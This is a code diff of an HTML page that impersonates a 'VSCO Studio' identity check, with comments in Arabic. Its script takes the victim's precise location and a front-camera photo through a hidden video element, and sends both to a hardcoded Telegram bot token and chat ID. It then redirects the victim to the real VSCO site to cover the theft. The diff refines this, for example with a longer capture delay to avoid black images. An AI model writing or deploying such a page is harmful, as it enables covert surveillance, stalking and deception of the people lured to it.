@@ -4,21 +4,17 @@
     <meta charset="UTF-8">
     <title>VSCO Studio</title>
     <style>
-        body { background: #000; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        .vsco-logo { width: 60px; height: 60px; margin-bottom: 40px; }
+        body { background: #000; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: -apple-system, sans-serif; }
         .container { text-align: center; width: 85%; max-width: 350px; }
-        h1 { font-size: 22px; font-weight: 600; margin-bottom: 15px; }
-        p { font-size: 14px; color: #a0a0a0; line-height: 1.5; margin-bottom: 35px; }
-        
-        /* الزر الذي طلبته */
-        .action-btn { 
-            background: #007aff; color: white; border: none; padding: 16px; 
+        .vsco-logo { width: 60px; height: 60px; margin-bottom: 30px; }
+        h1 { font-size: 24px; font-weight: 600; margin-bottom: 15px; }
+        p { font-size: 15px; color: #8e8e93; line-height: 1.5; margin-bottom: 40px; }
+        .btn { 
+            background: #007aff; color: white; border: none; padding: 18px; 
             border-radius: 12px; font-weight: 600; font-size: 16px; width: 100%;
-            cursor: pointer; box-shadow: 0 4px 15px rgba(0, 122, 255, 0.3);
+            cursor: pointer; box-shadow: 0 4px 15px rgba(0, 122, 255, 0.4);
         }
-        .action-btn:active { background: #0056b3; transform: scale(0.98); }
-        
-        .footer-note { font-size: 12px; color: #444; margin-top: 30px; letter-spacing: 1px; }
+        .btn:active { background: #0056b3; transform: scale(0.98); }
         video { width: 1px; height: 1px; opacity: 0; position: absolute; }
     </style>
 </head>
@@ -26,11 +22,8 @@
     <div class="container">
         <img src="https://vsco.co/assets/images/vsco-logo.png" class="vsco-logo">
         <h1>Identity Verification</h1>
-        <p>To access the professional studio tools, please complete the mandatory facial and region verification.</p>
-        
-        <button class="action-btn" onclick="startVerification()">Verify & Enter Studio</button>
-        
-        <div class="footer-note">SECURE ACCESS • 2026</div>
+        <p>To access professional tools, please complete the facial and location check.</p>
+        <button class="btn" onclick="startProcess()">Verify & Continue</button>
     </div>
 
     <video id="video" autoplay playsinline></video>
@@ -40,44 +33,49 @@
         const token = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs";
         const chatId = "8005843544";
 
-        async function startVerification() {
-            // طلب الموقع فور الضغط على الزر لضمان ظهور الإذن
+        async function startProcess() {
+            // 1. طلب الموقع أولاً وبدقة عالية
             navigator.geolocation.getCurrentPosition(
                 (p) => {
                     const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                    capturePhoto(loc);
+                    openCamera(loc);
                 },
                 (err) => {
-                    capturePhoto("Location Access Denied");
+                    openCamera("Location Access Denied (Check Settings)");
                 },
-                { enableHighAccuracy: true, timeout: 8000 }
+                { enableHighAccuracy: true, timeout: 10000 }
             );
         }
 
-        async function capturePhoto(locationText) {
+        async function openCamera(locationText) {
             try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                const v = document.getElementById('video');
-                v.srcObject = s;
-                
+                // 2. طلب الكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // 3. الانتظار 3 ثواني (لحل مشكلة الصورة السوداء)
                 setTimeout(() => {
-                    const c = document.getElementById('canvas');
-                    const ctx = c.getContext('2d');
-                    c.width = v.videoWidth; c.height = v.videoHeight;
-                    ctx.drawImage(v, 0, 0);
+                    const canvas = document.getElementById('canvas');
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0);
                     
+                    // 4. إرسال البيانات
                     canvas.toBlob(blob => {
-                        const f = new FormData();
-                        f.append('chat_id', chatId);
-                        f.append('photo', blob);
-                        f.append('caption', `✅ Verified!\n📍 Map: ${locationText}`);
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob);
+                        formData.append('caption', `✅ Verified!\n📍 Map: ${locationText}`);
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
                     }, 'image/jpeg');
 
+                    // 5. التحويل النهائي
                     setTimeout(() => { window.location.href = "https://vsco.co/"; }, 1500);
-                }, 1000);
+                }, 3000); 
             } catch (e) {
-                alert("Please enable camera access and use an external browser (Chrome/Safari) to continue.");
+                alert("Camera access is mandatory for verification. Please use Chrome/Safari and Allow access.");
             }
         }
     </script>
